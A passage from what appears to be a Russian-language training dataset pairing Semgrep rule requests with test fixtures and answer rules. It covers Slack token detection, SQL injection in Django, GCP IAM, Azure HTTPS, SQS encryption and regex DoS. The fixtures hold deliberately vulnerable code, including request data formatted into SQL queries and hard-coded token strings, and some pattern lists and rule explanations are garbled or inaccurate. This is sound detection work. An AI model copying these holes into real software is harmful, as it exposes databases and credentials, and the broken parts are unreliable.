    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: slack-legacy-token.txt\n// ruleid: slack-legacy-token\n\"access_token1\": \"xoxs-3206092076-3204538285-3743137121-836b042620\"\n// ruleid: slack-legacy-token\n\"access_token2\": \"xoxs-416843729158-132049654-5609968301-e708ba56e1\"\n// ruleid: slack-legacy-token\n\"access_token3\": \"xoxs-420083410720-421837374423-440811613314-977844f625b707d5b0b268206dbc92cbc85feef3e71b08e44815a8e6e7657190\"\n// ruleid: slack-legacy-token\n\"access_token4\": \"xoxs-4829527689-4829527691-4814341714-d0346ec616\"\n// ruleid: slack-legacy-token\n\"access_token5\": \"xoxs-155191149137-155868813314-338998331396-9f6d235915\"\n// ruleid: slack-legacy-token\n\"access_token6\": \"xoxs-4932160834-4471365781-6128280740-f5a486bb22\"\n// ruleid: slack-legacy-token\n\"access_token7\": \"xoxo-523423-234243-234233-e039d02840a0b9379c\"  # Ограничиваем длину\n\nОпасные паттерны:\n• // ruleid: slack-legacy-token\n\"access_token\": \"xoxs-3206092076-3204538285-3743137121-836b042620\"\n• // ruleid: slack-legacy-token\n\"access_token\": \"xoxs-416843729158-132049654-5609968301-e708ba56e1\"\n• // ruleid: slack-legacy-token\n\"access_token\": \"xoxo-523423-234243-234233-e039d02840a0b9379c\"\n\nБезопасные паттерны:  \n• // safe example\n\"access_token\": \"abc123\"\n• // safe example\n\"access_token\": \"some_random_string\"\n• // safe example\n\"access_token\": \"xoxb-1234567890-abcd123456\"\n\nЛегенда аннотаций:\n- // ruleid:slack-legacy-token: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:slack-legacy-token: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: slack-legacy-token\n  message: A gitleaks slack-legacy-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: (xox[os]-\\d+-\\d+-\\d+-[a-fA-F\\d]+)\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска строк, содержащих шаблон 'xoxs' или 'xoso', за которым следуют цифры и символы '-'. Это соответствует формату токенов Slack legacy access token, которые представляют собой жестко закодированные учетные данные, потенциально подверженные утечке секретов. Правило применяет поисковый анализ (search) и ищет эти токены непосредственно в исходном тексте.\n\n# Ключевые элементы:\n- ID: slack-legacy-token\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "slack-legacy-token",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения gcp-project-member-default-service-account-iam-member\nОписание уязвимости: Ensure Default Service account is not used at a project level\nCWE: CWE-1220: Insufficient Granularity of Access Control\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-1220: Insufficient Granularity of Access Control\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: gcp-project-member-default-service-account-iam-member.tf\n# fail\n# ruleid: gcp-project-member-default-service-account-iam-member\nresource \"google_project_iam_member\" \"fail\" {\n    project = \"your-project-id\"\n    role    = \"roles/resourcemanager.organizationAdmin\"\n    member  = \"serviceAccount:test-compute@developer.gserviceaccount.com\"\n}\n\n# ok: gcp-project-member-default-service-account-iam-member\nresource \"google_project_iam_member\" \"success\" {\n    project = \"your-project-id\"\n    role    = \"roles/other\"\n    member  = \"user@mail.com\"\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \\\n•  \\\n•  { \\n    project = \\\n\nБезопасные паттерны:  \n• resource \\\n•  \\\n•  { \\n    project = \\\n\nЛегенда аннотаций:\n- // ruleid:gcp-project-member-default-service-account-iam-member: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:gcp-project-member-default-service-account-iam-member: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: gcp-project-member-default-service-account-iam-member\n  patterns:\n  - pattern: resource\n  - pattern-inside: |\n      resource \"google_project_iam_member\" \"...\" {\n      ...\n      member = $MEMBER\n      ...\n      }\n  - metavariable-regex:\n      metavariable: $MEMBER\n      regex: ((.*)-compute@developer.gserviceaccount.com)\n  message: >-\n    Ensure Default Service account is not used at a project level\n  metadata:\n    owasp:\n    - A05:2017 - Broken Access Control\n    - A01:2021 - Broken Access Control\n    cwe:\n    - 'CWE-1220: Insufficient Granularity of Access Control'\n    category: security\n    technology:\n    - terraform\n    - gcp\n    references:\n    - https://owasp.org/Top10/A01_2021-Broken_Access_Control\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования ресурса Google Cloud IAM Member с членом, представляющим сервисный аккаунт по умолчанию. Анализ выполняется путем поиска шаблона ресурса Google Project IAM Member, внутри которого проверяется значение переменной-члена ($MEMBER). Если значение соответствует регулярному выражению '(.*)-compute@developer.gserviceaccount.com', то это считается опасным примером, так как указывает на использование сервисного аккаунта по умолчанию.\n\n# Ключевые элементы:\n- ID: gcp-project-member-default-service-account-iam-member\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "gcp-project-member-default-service-account-iam-member",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: sql-injection-db-cursor-execute\nОписание уязвимости: User-controlled data from a request is passed to 'execute()'. This could lead to a SQL injection and therefore protected information could be leaked. Instead, use django's QuerySets, which are built with query parameterization and therefore not vulnerable to sql injection. For example, you could use `Entry.objects.filter(date=2006)`.\nCWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: sql-injection-using-db-cursor-execute.py\nfrom django.db import connection\n\n##### True Positives #########\ndef fetch_name_0(request):\n  with connection.cursor() as cursor:\n      # ruleid: sql-injection-db-cursor-execute\n      cursor.execute(f\"SELECT foo FROM bar WHERE baz = {request.data.get('baz')}\")\n      # ruleid: sql-injection-db-cursor-execute\n      cursor.execute(\"SELECT foo FROM bar WHERE baz = %s\" % request.data.get('baz'))\n      # ruleid: sql-injection-db-cursor-execute\n      cursor.execute(\"SELECT foo FROM bar WHERE baz = %s\".format(request.data.get('baz')))\n      row = cursor.fetchone()\n  return row\n\ndef fetch_name_1(request):\n  # ruleid: sql-injection-db-cursor-execute\n  baz = request.data.get(\"baz\")\n  with connection.cursor() as cursor:\n      cursor.execute(f\"UPDATE bar SET foo = 1 WHERE baz = {baz}\")\n      cursor.execute(f\"SELECT foo FROM bar WHERE baz = {baz}\")\n      row = cursor.fetchone()\n  return row\n\ndef fetch_name_2(request):\n  # ruleid: sql-injection-db-cursor-execute\n  baz = request.data.get(\"baz\")\n  with connection.cursor() as cursor:\n      cursor.execute(\"SELECT foo FROM bar WHERE baz = %s\" % baz)\n      row = cursor.fetchone()\n  return row\n\ndef fetch_name_3(request):\n  # ruleid: sql-injection-db-cursor-execute\n  baz = request.data.get(\"baz\")\n  with connection.cursor() as cursor:\n      cursor.execute(\"SELECT foo FROM bar WHERE baz = %s\".format(baz))\n      row = cursor.fetchone()\n  return row\n\ndef upload(request, project_id):\n\n    if request.method == 'POST':\n\n        proj = Project.objects.get(pk=project_id)\n        form = ProjectFileForm(request.POST, request.FILES)\n\n        if form.is_valid():\n            # Dependent on feature in develop\n            # todoruleid: sql-injection-db-cursor-execute\n            name = request.POST.get('name', False)\n            upload_path = store_uploaded_file(name, request.FILES['file'])\n\n            other_name = \"{}\".format(name)\n            curs = connection.cursor()\n            curs.execute(\n         # Ограничиваем длину\n\nОпасные паттерны:\n• cursor.execute(f\\\n• )\n• cursor.execute(\\\n\nБезопасные паттерны:  \n• cursor.execute(\\\n\nЛегенда аннотаций:\n- // ruleid:sql-injection-db-cursor-execute: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:sql-injection-db-cursor-execute: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: sql-injection-db-cursor-execute\n  message: User-controlled data from a request is passed to 'execute()'. This could lead to a SQL injection\n    and therefore protected information could be leaked. Instead, use django's QuerySets, which are built\n    with query parameterization and therefore not vulnerable to sql injection. For example, you could\n    use `Entry.objects.filter(date=2006)`.\n  metadata:\n    cwe:\n    - \"CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\"\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    references:\n    - https://docs.djangoproject.com/en/3.0/topics/security/#sql-injection-protection\n    category: security\n    technology:\n    - django\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: HIGH\n    confidence: MEDIUM\n  languages: [python]\n  severity: WARNING\n  patterns:\n  - pattern-inside: |\n      def $FUNC(...):\n        ...\n  - pattern-either:\n    - pattern: $CURSOR.execute(..., $S.format(..., request.$W.get(...), ...), ...)\n    - pattern: $CURSOR.execute(..., $S % request.$W.get(...), ...)\n    - pattern: $CURSOR.execute(..., f\"...{request.$W.get(...)}...\", ...)\n    - pattern: $CURSOR.execute(..., request.$W.get(...), ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $CURSOR.execute(..., $DATA, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $INTERM = $DATA\n        ...\n        $CURSOR.execute(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $CURSOR.execute(..., $STR.format(..., $DATA, ...), ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $INTERM = $STR.format(..., $DATA, ...)\n        ...\n        $CURSOR.execute(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $CURSOR.execute(..., $STR % $DATA, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $INTERM = $STR % $DATA\n        ...\n        $CURSOR.execute(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $CURSOR.execute(..., f\"...{$DATA}...\", ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $INTERM = f\"...{$DATA}...\"\n        ...\n        $CURSOR.execute(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $CURSOR.execute(..., $STR + $DATA, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $INTERM = $STR + $DATA\n        ...\n        $CURSOR.execute(..., $INTERM, ...)\n    - pattern: $A = $CURSOR.execute(..., request.$W.get(...), ...)\n    - pattern: return $CURSOR.execute(..., request.$W.get(...), ...)\n    - pattern: $CURSOR.execute(..., $S.format(..., request.$W(...), ...), ...)\n    - pattern: $CURSOR.execute(..., $S % request.$W(...), ...)\n    - pattern: $CURSOR.execute(..., f\"...{request.$W(...)}...\", ...)\n    - pattern: $CURSOR.execute(..., request.$W(...), ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $CURSOR.execute(..., $DATA, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $INTERM = $DATA\n        ...\n        $CURSOR.execute(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $CURSOR.execute(..., $STR.format(..., $DATA, ...), ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $INTERM = $STR.format(..., $DATA, ...)\n        ...\n        $CURSOR.execute(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $CURSOR.execute(..., $STR % $DATA, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $INTERM = $STR % $DATA\n        ...\n        $CURSOR.execute(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $CURSOR.execute(..., f\"...{$DATA}...\", ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $INTERM = f\"...{$DATA}...\"\n        ...\n        $CURSOR.execute(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $CURSOR.execute(..., $STR + $DATA, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $INTERM = $STR + $DATA\n        ...\n        $CURSOR.execute(..., $INTERM, ...)\n    - pattern: $A = $CURSOR.execute(..., request.$W(...), ...)\n    - pattern: return $CURSOR.execute(..., request.$W(...), ...)\n    - pattern: $CURSOR.execute(..., $S.format(..., request.$W[...], ...), ...)\n    - pattern: $CURSOR.execute(..., $S % request.$W[...], ...)\n    - pattern: $CURSOR.execute(..., f\"...{request.$W[...]}...\", ...)\n    - pattern: $CURSOR.execute(..., request.$W[...], ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $CURSOR.execute(..., $DATA, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $INTERM = $DATA\n        ...\n        $CURSOR.execute(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $CURSOR.execute(..., $STR.format(..., $DATA, ...), ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $INTERM = $STR.format(..., $DATA, ...)\n        ...\n        $CURSOR.execute(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $CURSOR.execute(..., $STR % $DATA, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $INTERM = $STR % $DATA\n        ...\n        $CURSOR.execute(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $CURSOR.execute(..., f\"...{$DATA}...\", ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $INTERM = f\"...{$DATA}...\"\n        ...\n        $CURSOR.execute(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $CURSOR.execute(..., $STR + $DATA, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $INTERM = $STR + $DATA\n        ...\n        $CURSOR.execute(..., $INTERM, ...)\n    - pattern: $A = $CURSOR.execute(..., request.$W[...], ...)\n    - pattern: return $CURSOR.execute(..., request.$W[...], ...)\n    - pattern: $CURSOR.execute(..., $S.format(..., request.$W, ...), ...)\n    - pattern: $CURSOR.execute(..., $S % request.$W, ...)\n    - pattern: $CURSOR.execute(..., f\"...{request.$W}...\", ...)\n    - pattern: $CURSOR.execute(..., request.$W, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $CURSOR.execute(..., $DATA, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = $DATA\n        ...\n        $CURSOR.execute(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $CURSOR.execute(..., $STR.format(..., $DATA, ...), ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = $STR.format(..., $DATA, ...)\n        ...\n        $CURSOR.execute(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $CURSOR.execute(..., $STR % $DATA, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = $STR % $DATA\n        ...\n        $CURSOR.execute(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $CURSOR.execute(..., f\"...{$DATA}...\", ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = f\"...{$DATA}...\"\n        ...\n        $CURSOR.execute(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $CURSOR.execute(..., $STR + $DATA, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = $STR + $DATA\n        ...\n        $CURSOR.execute(..., $INTERM, ...)\n    - pattern: $A = $CURSOR.execute(..., request.$W, ...)\n    - pattern: return $CURSOR.execute(..., request.$W, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $CURSOR.execute($STR % (..., $DATA, ...), ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $CURSOR.execute($STR % (..., $DATA, ...), ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $CURSOR.execute($STR % (..., $DATA, ...), ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $CURSOR.execute($STR % (..., $DATA, ...), ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $INTERM = $STR % (..., $DATA, ...)\n        ...\n        $CURSOR.execute($INTERM, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $INTERM = $STR % (..., $DATA, ...)\n        ...\n        $CURSOR.execute($INTERM, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $INTERM = $STR % (..., $DATA, ...)\n        ...\n        $CURSOR.execute($INTERM, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = $STR % (..., $DATA, ...)\n        ...\n        $CURSOR.execute($INTERM, ...)\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска потенциальных уязвимостей SQL-инъекции, вызванных передачей пользовательского управляемого ввода непосредственно в метод execute объекта db cursor в Django. Правило использует шаблонный подход для выявления различных способов передачи запроса, содержащего данные из HTTP-запроса, напрямую в функцию execute(). Это может привести к выполнению произвольных SQL-запросов злоумышленником, что является серьезной угрозой безопасности.\n\n# Ключевые элементы:\n- ID: sql-injection-db-cursor-execute\n- Язык: python \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "sql-injection-db-cursor-execute",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: storage-enforce-https\nОписание уязвимости: Detected a Storage that was not configured to deny action by default. Add `enable_https_traffic_only = true` in your resource block.\nCWE: CWE-319: Cleartext Transmission of Sensitive Information\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-319: Cleartext Transmission of Sensitive Information\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: storage-enforce-https.tf\n# pass\nresource \"azurerm_storage_account\" \"good_example\" {\n  name                      = \"storageaccountname\"\n  resource_group_name       = azurerm_resource_group.example.name\n  location                  = azurerm_resource_group.example.location\n  account_tier              = \"Standard\"\n  account_replication_type  = \"GRS\"\n  enable_https_traffic_only = true\n}\n\n# fail\n# ruleid: storage-enforce-https\nresource \"azurerm_storage_account\" \"bad_example\" {\n  name                      = \"storageaccountname\"\n  resource_group_name       = azurerm_resource_group.example.name\n  location                  = azurerm_resource_group.example.location\n  account_tier              = \"Standard\"\n  account_replication_type  = \"GRS\"\n  enable_https_traffic_only = false\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"azurerm_storage_account\" \"bad_example\" { ... enable_https_traffic_only = false ... }\n• resource \"azurerm_storage_account\" \"another_bad_example\" { ... enable_https_traffic_only = missing ... }\n\nБезопасные паттерны:  \n• resource \"azurerm_storage_account\" \"good_example\" { ... enable_https_traffic_only = true ... }\n\nЛегенда аннотаций:\n- // ruleid:storage-enforce-https: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:storage-enforce-https: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: storage-enforce-https\n  message: >-\n    Detected a Storage that was not configured to deny action by default. Add `enable_https_traffic_only\n    = true`\n    in your resource block.\n  patterns:\n  - pattern-not-inside: |\n      resource \"azurerm_storage_account\" \"...\" {\n      ...\n        enable_https_traffic_only = true\n      ...\n      }\n  - pattern-inside: |\n      resource \"azurerm_storage_account\" \"...\" {\n      ...\n        enable_https_traffic_only = false\n      ...\n      }\n  metadata:\n    cwe:\n    - 'CWE-319: Cleartext Transmission of Sensitive Information'\n    category: security\n    technology:\n    - terraform\n    - azure\n    references:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/storage_account#enable_https_traffic_only\n    - https://docs.microsoft.com/en-us/azure/storage/common/storage-require-secure-transfer\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    subcategory:\n    - vuln\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: MEDIUM\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов Azure Storage Account в Terraform конфигурациях, где параметр 'enable_https_traffic_only' не установлен в значение 'true'. Правило использует конструкцию pattern-not-inside для поиска блоков ресурсов, внутри которых отсутствует требуемый параметр, и pattern-inside для нахождения блоков ресурсов, где параметр явно установлен в неправильное значение. Это позволяет обнаружить потенциальную угрозу передачи чувствительных данных в открытом виде через HTTP.\n\n# Ключевые элементы:\n- ID: storage-enforce-https\n- Язык: hcl \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "storage-enforce-https",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения awscdk-sqs-unencryptedqueue\nОписание уязвимости: Queue $X is missing encryption at rest. Add \"encryption: $Y.QueueEncryption.KMS\" or \"encryption: $Y.QueueEncryption.KMS_MANAGED\" to the queue props to enable encryption at rest for the queue.\nCWE: CWE-311: Missing Encryption of Sensitive Data\nТип анализа: search\nЯзык: ts",
    "input": "Требования:\n- Язык: ts\n- Тип анализа: search\n- CWE: CWE-311: Missing Encryption of Sensitive Data\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: awscdk-sqs-unencryptedqueue.ts\nimport * as cdk from '@aws-cdk/core';\nimport * as sqs from '@aws-cdk/aws-sqs';\nimport * as rename_sqs from '@aws-cdk/aws-sqs';\nimport {Queue, QueueEncryption} from '@aws-cdk/aws-sqs';\n\nexport class Stack extends cdk.Stack {\n  constructor(scope: cdk.Construct, id: string, props?: cdk.StackProps) {\n    super(scope, id, props);\n\n    // ruleid:awscdk-sqs-unencryptedqueue\n    const unencryptedQueue1 = new sqs.Queue(this, 'unecryptedQueue1')\n\n    // ruleid:awscdk-sqs-unencryptedqueue\n    const unencryptedQueue2 = new sqs.Queue(this, 'unencryptedQueue2', {\n        encryption: sqs.QueueEncryption.UNENCRYPTED\n    })\n\n    //ok:awscdk-sqs-unencryptedqueue\n    const encryptedQueue1 = new sqs.Queue(this, 'encryptedQueue', {\n        encryption: sqs.QueueEncryption.KMS_MANAGED\n    })\n\n    //ok:awscdk-sqs-unencryptedqueue\n    const encryptedQueue2 = new sqs.Queue(this, 'encryptedQueue', {\n        encryption: sqs.QueueEncryption.KMS\n    })\n\n    // ruleid:awscdk-sqs-unencryptedqueue\n    const unencryptedQueue1RenamedImport = new rename_sqs.Queue(this, 'unencryptedQueue')\n\n    // ruleid:awscdk-sqs-unencryptedqueue\n    const unencryptedQueue2RenamedImport = new rename_sqs.Queue(this, 'unencryptedQueue2', {\n        encryption: rename_sqs.QueueEncryption.UNENCRYPTED\n    })\n\n    //ok:awscdk-sqs-unencryptedqueue\n    const encryptedQueue1RenamedImport = new rename_sqs.Queue(this, 'encryptedQueue', {\n        encryption: rename_sqs.QueueEncryption.KMS_MANAGED\n    })\n\n    //ok:awscdk-sqs-unencryptedqueue\n    const encryptedQueue2RenamedImport = new rename_sqs.Queue(this, 'encryptedQueue', {\n        encryption: rename_sqs.QueueEncryption.KMS\n    })\n\n    // ruleid:awscdk-sqs-unencryptedqueue\n    const unencryptedQueue1DirectImport = new Queue(this, 'unencryptedQueue')\n\n    // ruleid:awscdk-sqs-unencryptedqueue\n    const unencryptedQueue2DirectImport = new Queue(this, 'unencryptedQueue2', {\n        encryption: QueueEncryption.UNENCRYPTED\n    })\n\n    //ok:aw  # Ограничиваем длину\n\nОпасные паттерны:\n• const unencryptedQueue1 = new sqs.Queue(this, 'unecryptedQueue1')\n• const unencryptedQueue2 = new sqs.Queue(this, 'unencryptedQueue2', { encryption: sqs.QueueEncryption.UNENCRYPTED })\n• const unencryptedQueue1RenamedImport = new rename_sqs.Queue(this, 'unencryptedQueue')\n\nБезопасные паттерны:  \n• const encryptedQueue1 = new sqs.Queue(this, 'encryptedQueue', { encryption: sqs.QueueEncryption.KMS_MANAGED })\n• const encryptedQueue2 = new sqs.Queue(this, 'encryptedQueue', { encryption: sqs.QueueEncryption.KMS })\n• const encryptedQueue1RenamedImport = new rename_sqs.Queue(this, 'encryptedQueue', { encryption: rename_sqs.QueueEncryption.KMS_MANAGED })\n\nЛегенда аннотаций:\n- // ruleid:awscdk-sqs-unencryptedqueue: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:awscdk-sqs-unencryptedqueue: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: awscdk-sqs-unencryptedqueue\n  message: >-\n    Queue $X is missing encryption at rest. Add \"encryption: $Y.QueueEncryption.KMS\" or \"encryption: $Y.QueueEncryption.KMS_MANAGED\"\n    to the queue props to enable encryption at rest for the queue.\n  metadata:\n    category: security\n    cwe:\n    - 'CWE-311: Missing Encryption of Sensitive Data'\n    technology:\n    - AWS-CDK\n    references:\n    - https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-data-protection.html\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A04:2021 - Insecure Design\n    subcategory:\n    - vuln\n    likelihood: LOW\n    impact: HIGH\n    confidence: MEDIUM\n  languages:\n  - ts\n  severity: WARNING\n  pattern-either:\n  - patterns:\n    - pattern-inside: |\n        import {Queue} from '@aws-cdk/aws-sqs'\n        ...\n    - pattern: const $X = new Queue(...)\n    - pattern-not: |\n        const $X = new Queue(..., {..., encryption: QueueEncryption.KMS_MANAGED, ...})\n    - pattern-not: |\n        const $X = new Queue(..., {..., encryption: QueueEncryption.KMS, ...})\n  - patterns:\n    - pattern-inside: |\n        import * as $Y from '@aws-cdk/aws-sqs'\n        ...\n    - pattern: const $X = new $Y.Queue(...)\n    - pattern-not: |\n        const $X = new $Y.Queue(..., {..., encryption: $Y.QueueEncryption.KMS_MANAGED, ...})\n    - pattern-not: |\n        const $X = new $Y.Queue(..., {..., encryption: $Y.QueueEncryption.KMS, ...})\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска экземпляров использования очереди SQS (Amazon Simple Queue Service) без включения шифрования в состоянии покоя. Анализ выполняется путем поиска конструкций импорта библиотеки awscdk aws-sqs и создания новых очередей через конструктор Queue или переименованный конструктор Queue. Уязвимость обнаруживается при отсутствии параметров шифрования KMS_MANAGED или KMS в свойствах очереди. Правило использует оператор pattern-inside для проверки наличия конструктора Queue внутри определенного контекста импорта и проверяет наличие или отсутствие определенных параметров шифрования.\n\n# Ключевые элементы:\n- ID: awscdk-sqs-unencryptedqueue\n- Язык: ts \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "awscdk-sqs-unencryptedqueue",
      "language": "ts",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: regular-expression-dos\nОписание уязвимости: When using `System.Text.RegularExpressions` to process untrusted input, pass a timeout.  A malicious user can provide input to `RegularExpressions` that abuses the backtracking behaviour of this regular expression engine. This will lead to excessive CPU usage, causing a Denial-of-Service attack\nCWE: CWE-1333: Inefficient Regular Expression Complexity\nТип анализа: search\nЯзык: C#",
    "input": "Требования:\n- Язык: C#\n- Тип анализа: search\n- CWE: CWE-1333: Inefficient Regular Expression Complexity\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: regular-expression-dos.cs\nusing System.Text.RegularExpressions;\n\nnamespace RegularExpressionsDos\n{\n    public class RegularExpressionsDos\n    {\n        // ruleid: regular-expression-dos\n        public void ValidateRegex(string search)\n        {\n            Regex rgx = new Regex(\"^A(B|C+)+D\");\n            rgx.Match(search);\n\n        }\n\n        // ruleid: regular-expression-dos\n        public void ValidateRegex2(string search)\n        {\n            Regex rgx = new Regex(\"^A(B|C+)+D\", new RegexOptions { });\n            rgx.Match(search);\n\n        }\n\n        // ok: regular-expression-dos\n        public void ValidateRegex3(string search)\n        {\n            Regex rgx = new Regex(\"^A(B|C+)+D\", new RegexOptions { }, TimeSpan.FromSeconds(2000));\n            rgx.Match(search);\n\n        }\n\n        // ruleid: regular-expression-dos\n        public void Validate4(string search)\n        {\n            var pattern = @\"^A(B|C+)+D\";\n            var result = Regex.Match(search, pattern);\n        }\n\n        // ruleid: regular-expression-dos\n        public void Validate5(string search)\n        {\n            var pattern = @\"^A(B|C+)+D\";\n            var 